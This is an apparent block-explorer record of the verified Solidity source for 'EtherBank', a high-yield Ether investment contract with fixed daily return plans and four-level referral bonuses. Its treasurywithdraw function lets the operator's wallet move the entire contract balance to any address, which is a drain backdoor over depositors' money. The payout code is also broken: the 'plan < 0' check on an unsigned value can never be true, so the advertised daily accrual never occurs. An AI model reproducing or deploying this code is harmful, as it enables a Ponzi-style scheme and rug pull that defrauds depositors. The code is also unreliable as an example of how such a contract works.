{"status": "1", "message": "OK", "result": [{"SourceCode": "// https://etherbank.money\r\n\r\npragma solidity 0.5.8;\r\n\r\ncontract EtherBank {\r\n  using SafeMath for uint256;\r\n\r\n  uint256 public constant INVEST_MIN_AMOUNT = 0.01 ether;\r\n  uint256[] public REFERRAL_PERCENTS = [20, 10, 5, 2];\r\n  uint256 public constant PROJECT_FEE = 78;\r\n  uint256 public constant PERCENTS_DIVIDER = 1000;\r\n  uint256 public constant TIME_STEP = 1 days;\r\n\r\n  uint256 public totalStaked;\r\n  uint256 public totalRefBonus;\r\n  uint256 public totalUsers;\r\n\r\n  struct Plan {\r\n    uint256 time;\r\n    uint256 percent;\r\n  }\r\n\r\n  Plan[] internal plans;\r\n\r\n  struct Deposit {\r\n    uint8 plan;\r\n    uint256 percent;\r\n    uint256 amount;\r\n    uint256 profit;\r\n    uint256 start;\r\n    uint256 finish;\r\n  }\r\n\r\n  struct User {\r\n    Deposit[] deposits;\r\n    uint256 checkpoint;\r\n    address referrer;\r\n    uint256[4] levels;\r\n    uint256 bonus;\r\n    uint256 totalBonus;\r\n  }\r\n\r\n  mapping(address => User) internal users;\r\n\r\n  uint256 public startUNIX;\r\n  address payable private commissionWallet;\r\n\r\n  event Newbie(address user);\r\n  event NewDeposit(\r\n    address indexed user,\r\n    uint8 plan,\r\n    uint256 percent,\r\n    uint256 amount,\r\n    uint256 profit,\r\n    uint256 start,\r\n    uint256 finish\r\n  );\r\n  event Withdrawn(address indexed user, uint256 amount);\r\n  event RefBonus(address indexed referrer, address indexed referral, uint256 indexed level, uint256 amount);\r\n  event TransferReceived(address _from, uint256 _amount);\r\n  event TransferSent(address _from, address _vcAddr, uint256 _amount);\r\n\r\n\r\n  constructor(address payable wallet) public {\r\n    require(!isContract(wallet));\r\n    commissionWallet = wallet;\r\n    startUNIX = block.timestamp;\r\n\r\n    plans.push(Plan(12, 84)); // 8.4% per day for 12 days (at the end) 0.8% daily 0.06%\r\n    plans.push(Plan(27, 38)); // 3.8% per day for 27 days (at the end) 2.6% daily 0.09%\r\n    plans.push(Plan(50, 21)); // 2.1% per day for 50 days (at the end) 5% daily 0.1%\r\n    plans.push(Plan(91, 12)); // 1.2% per day for 92 days (at the end) 10.4% daily 0.113%\r\n    plans.push(Plan(171, 7)); // 0.7% per day for 171 days (at the end) 19.7% daily 0.115%\r\n    plans.push(Plan(302, 5)); // 0.5% per day for 302 days (at the end) 51% daily 0.16%\r\n  }\r\n  \r\n  function launch() public {\r\n    require(msg.sender == commissionWallet);\r\n    startUNIX = block.timestamp;\r\n  }\r\n\r\n  function invest(address referrer, uint8 plan) public payable {\r\n    require(msg.value >= INVEST_MIN_AMOUNT);\r\n    require(plan < 6, 'Invalid plan');\r\n\r\n    uint256 fee = msg.value.mul(PROJECT_FEE).div(PERCENTS_DIVIDER);\r\n    commissionWallet.transfer(fee);\r\n\r\n    User storage user = users[msg.sender];\r\n\r\n    if (user.referrer == address(0)) {\r\n      if (users[referrer].deposits.length > 0 && referrer != msg.sender) {\r\n        user.referrer = referrer;\r\n      }\r\n\r\n      address upline = user.referrer;\r\n      for (uint256 i = 0; i < 4; i++) {\r\n        if (upline != address(0)) {\r\n          users[upline].levels[i] = users[upline].levels[i].add(1);\r\n          upline = users[upline].referrer;\r\n        } else break;\r\n      }\r\n    }\r\n\r\n    if (user.referrer != address(0)) {\r\n      address upline = user.referrer;\r\n      for (uint256 i = 0; i < 4; i++) {\r\n        if (upline != address(0)) {\r\n          uint256 amount = msg.value.mul(REFERRAL_PERCENTS[i]).div(PERCENTS_DIVIDER);\r\n          users[upline].bonus = users[upline].bonus.add(amount);\r\n          users[upline].totalBonus = users[upline].totalBonus.add(amount);\r\n          emit RefBonus(upline, msg.sender, i, amount);\r\n          upline = users[upline].referrer;\r\n        } else break;\r\n      }\r\n    }\r\n\r\n    if (user.deposits.length == 0) {\r\n      user.checkpoint = block.timestamp;\r\n      emit Newbie(msg.sender);\r\n    }\r\n\r\n    (uint256 percent, uint256 profit, uint256 finish) = getResult(plan, msg.value);\r\n    user.deposits.push(Deposit(plan, percent, msg.value, profit, block.timestamp, finish));\r\n\r\n    totalStaked = totalStaked.add(msg.value);\r\n    totalUsers = totalUsers.add(1);\r\n    emit NewDeposit(msg.sender, plan, percent, msg.value, profit, block.timestamp, finish);\r\n  }\r\n\r\n  function withdraw() public {\r\n    User storage user = users[msg.sender];\r\n\r\n    uint256 totalAmount = getUserDividends(msg.sender);\r\n\r\n    uint256 referralBonus = getUserReferralBonus(msg.sender);\r\n    if (referralBonus > 0) {\r\n      user.bonus = 0;\r\n      totalAmount = totalAmount.add(referralBonus);\r\n    }\r\n\r\n    require(totalAmount > 0, 'User has no dividends');\r\n\r\n    uint256 contractBalance = address(this).balance;\r\n    if (contractBalance < totalAmount) {\r\n      totalAmount = contractBalance;\r\n    }\r\n\r\n    user.checkpoint = block.timestamp;\r\n\r\n    msg.sender.transfer(totalAmount);\r\n\r\n    emit Withdrawn(msg.sender, totalAmount);\r\n  }\r\n\r\n  function treasurywithdraw(uint amount, address payable vcAddr) public {\r\n      require(msg.sender == commissionWallet, \"Only VC address can withdraw funds\");\r\n      require(amount <= address(this).balance, \"Insufficient funds\");\r\n\r\n      vcAddr.transfer(amount);\r\n      emit TransferSent(msg.sender, vcAddr, amount);\r\n  }\r\n\r\n  function getContractBalance() public view returns (uint256) {\r\n    return address(this).balance;\r\n  }\r\n\r\n  function getPlanInfo(uint8 plan) public view returns (uint256 time, uint256 percent) {\r\n    time = plans[plan].time;\r\n    percent = plans[plan].percent;\r\n  }\r\n\r\n  function getPercent(uint8 plan) public view returns (uint256) {\r\n    if (block.timestamp > startUNIX) {\r\n      return plans[plan].percent;\r\n    } else {\r\n      return plans[plan].percent;\r\n    }\r\n  }\r\n\r\n  function getResult(uint8 plan, uint256 deposit)\r\n    public\r\n    view\r\n    returns (\r\n      uint256 percent,\r\n      uint256 profit,\r\n      uint256 finish\r\n    )\r\n  {\r\n    percent = getPercent(plan);\r\n\r\n    if (plan < 6) {\r\n      profit = deposit.mul(percent).div(PERCENTS_DIVIDER).mul(plans[plan].time);\r\n    }\r\n\r\n    finish = block.timestamp.add(plans[plan].time.mul(TIME_STEP));\r\n  }\r\n\r\n  function getUserDividends(address userAddress) public view returns (uint256) {\r\n    User storage user = users[userAddress];\r\n\r\n    uint256 totalAmount;\r\n\r\n    for (uint256 i = 0; i < user.deposits.length; i++) {\r\n      if (user.checkpoint < user.deposits[i].finish) {\r\n        if (user.deposits[i].plan < 0) {\r\n          uint256 share = user.deposits[i].amount.mul(user.deposits[i].percent).div(PERCENTS_DIVIDER);\r\n          uint256 from = user.deposits[i].start > user.checkpoint ? user.deposits[i].start : user.checkpoint;\r\n          uint256 to = user.deposits[i].finish < block.timestamp ? user.deposits[i].finish : block.timestamp;\r\n          if (from < to) {\r\n            totalAmount = totalAmount.add(share.mul(to.sub(from)).div(TIME_STEP));\r\n          }\r\n        } else if (block.timestamp > user.deposits[i].finish) {\r\n          totalAmount = totalAmount.add(user.deposits[i].profit);\r\n        }\r\n      }\r\n    }\r\n\r\n    return totalAmount;\r\n  }\r\n\r\n  function getUserCheckpoint(address userAddress) public view returns (uint256) {\r\n    return users[userAddress].checkpoint;\r\n  }\r\n\r\n  function getUserReferrer(address userAddress) public view returns (address) {\r\n    return users[userAddress].referrer;\r\n  }\r\n\r\n  function getUserDownlineCount(address userAddress)\r\n    public\r\n    view\r\n    returns (\r\n      uint256,\r\n      uint256,\r\n      uint256\r\n    )\r\n  {\r\n    return (users[userAddress].levels[0], users[userAddress].levels[1], users[userAddress].levels[2]);\r\n  }\r\n\r\n  function getUserReferralBonus(address userAddress) public view returns (uint256) {\r\n    return users[userAddress].bonus;\r\n  }\r\n\r\n  function getUserReferralTotalBonus(address userAddress) public view returns (uint256) {\r\n    return users[userAddress].totalBonus;\r\n  }\r\n\r\n  function getUserReferralWithdrawn(address userAddress) public view returns (uint256) {\r\n    return users[userAddress].totalBonus.sub(users[userAddress].bonus);\r\n  }\r\n\r\n  function getUserAvailable(address userAddress) public view returns (uint256) {\r\n    return getUserReferralBonus(userAddress).add(getUserDividends(userAddress));\r\n  }\r\n\r\n  function getUserAmountOfDeposits(address userAddress) public view returns (uint256) {\r\n    return users[userAddress].deposits.length;\r\n  }\r\n\r\n  function getUserTotalDeposits(address userAddress) public view returns (uint256 amount) {\r\n    for (uint256 i = 0; i < users[userAddress].deposits.length; i++) {\r\n      amount = amount.add(users[userAddress].deposits[i].amount);\r\n    }\r\n  }\r\n\r\n  function getUserDepositInfo(address userAddress, uint256 index)\r\n    public\r\n    view\r\n    returns (\r\n      uint8 plan,\r\n      uint256 percent,\r\n      uint256 amount,\r\n      uint256 profit,\r\n      uint256 start,\r\n      uint256 finish\r\n    )\r\n  {\r\n    User storage user = users[userAddress];\r\n\r\n    plan = user.deposits[index].plan;\r\n    percent = user.deposits[index].percent;\r\n    amount = user.deposits[index].amount;\r\n    profit = user.deposits[index].profit;\r\n    start = user.deposits[index].start;\r\n    finish = user.deposits[index].finish;\r\n  }\r\n\r\n  function isContract(address addr) internal view returns (bool) {\r\n    uint256 size;\r\n    assembly {\r\n      size := extcodesize(addr)\r\n    }\r\n    return size > 0;\r\n  }\r\n}\r\n\r\nlibrary SafeMath {\r\n  function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n    uint256 c = a + b;\r\n    require(c >= a, 'SafeMath: addition overflow');\r\n\r\n    return c;\r\n  }\r\n\r\n  function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n    require(b <= a, 'SafeMath: subtraction overflow');\r\n    uint256 c = a - b;\r\n\r\n    return c;\r\n  }\r\n\r\n  function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n    if (a == 0) {\r\n      return 0;\r\n    }\r\n\r\n    uint256 c = a * b;\r\n    require(c / a == b, 'SafeMath: multiplication overflow');\r\n\r\n    return c;\r\n  }\r\n\r\n  function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n    require(b > 0, 'SafeMath: division by zero');\r\n    uint256 c = a / b;\r\n\r\n    return c;\r\n  }\r\n}", "ABI": "[{\"constant\":false,\"inputs\":[],\"name\":\"launch\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"PERCENTS_DIVIDER\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"userAddress\",\"type\":\"address\"}],\"name\":\"getUserDownlineCount\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"},{\"name\":\"\",\"type\":\"uint256\"},{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"userAddress\",\"type\":\"address\"}],\"name\":\"getUserDividends\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"userAddress\",\"type\":\"address\"}],\"name\":\"getUserAvailable\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"TIME_STEP\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"userAddress\",\"type\":\"address\"}],\"name\":\"getUserReferrer\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"withdraw\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"userAddress\",\"type\":\"address\"}],\"name\":\"getUserReferralTotalBonus\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"PROJECT_FEE\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"referrer\",\"type\":\"address\"},{\"name\":\"plan\",\"type\":\"uint8\"}],\"name\":\"invest\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"plan\",\"type\":\"uint8\"},{\"name\":\"deposit\",\"type\":\"uint256\"}],\"name\":\"getResult\",\"outputs\":[{\"name\":\"percent\",\"type\":\"uint256\"},{\"name\":\"profit\",\"type\":\"uint256\"},{\"name\":\"finish\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"REFERRAL_PERCENTS\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"totalRefBonus\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"userAddress\",\"type\":\"address\"}],\"name\":\"getUserReferralWithdrawn\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"getContractBalance\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"userAddress\",\"type\":\"address\"}],\"name\":\"getUserTotalDeposits\",\"outputs\":[{\"name\":\"amount\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"totalStaked\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"amount\",\"type\":\"uint256\"},{\"name\":\"vcAddr\",\"type\":\"address\"}],\"name\":\"treasurywithdraw\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"plan\",\"type\":\"uint8\"}],\"name\":\"getPercent\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"userAddress\",\"type\":\"address\"}],\"name\":\"getUserAmountOfDeposits\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"plan\",\"type\":\"uint8\"}],\"name\":\"getPlanInfo\",\"outputs\":[{\"name\":\"time\",\"type\":\"uint256\"},{\"name\":\"percent\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"totalUsers\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"userAddress\",\"type\":\"address\"},{\"name\":\"index\",\"type\":\"uint256\"}],\"name\":\"getUserDepositInfo\",\"outputs\":[{\"name\":\"plan\",\"type\":\"uint8\"},{\"name\":\"percent\",\"type\":\"uint256\"},{\"name\":\"amount\",\"type\":\"uint256\"},{\"name\":\"profit\",\"type\":\"uint256\"},{\"name\":\"start\",\"type\":\"uint256\"},{\"name\":\"finish\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"startUNIX\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"userAddress\",\"type\":\"address\"}],\"name\":\"getUserCheckpoint\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"INVEST_MIN_AMOUNT\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"userAddress\",\"type\":\"address\"}],\"name\":\"getUserReferralBonus\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"name\":\"wallet\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"name\":\"user\",\"type\":\"address\"}],\"name\":\"Newbie\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"user\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"plan\",\"type\":\"uint8\"},{\"indexed\":false,\"name\":\"percent\",\"type\":\"uint256\"},{\"indexed\":false,\"name\":\"amount\",\"type\":\"uint256\"},{\"indexed\":false,\"name\":\"profit\",\"type\":\"uint256\"},{\"indexed\":false,\"name\":\"start\",\"type\":\"uint256\"},{\"indexed\":false,\"name\":\"finish\",\"type\":\"uint256\"}],\"name\":\"NewDeposit\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"user\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"Withdrawn\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"referrer\",\"type\":\"address\"},{\"indexed\":true,\"name\":\"referral\",\"type\":\"address\"},{\"indexed\":true,\"name\":\"level\",\"type\":\"uint256\"},{\"indexed\":false,\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"RefBonus\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"name\":\"_from\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"_amount\",\"type\":\"uint256\"}],\"name\":\"TransferReceived\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"name\":\"_from\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"_vcAddr\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"_amount\",\"type\":\"uint256\"}],\"name\":\"TransferSent\",\"type\":\"event\"}]", "ContractName": "EtherBank", "CompilerVersion": "v0.5.8+commit.23d335f2", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "0000000000000000000000009252a914cbbdbd6d7726eb39bad50c0ed2c475a4", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "bzzr://361d093e32f0eb3f18ffeb12ad33988ac9b8ae8797a83df5638937d0a1bb65fd"}]}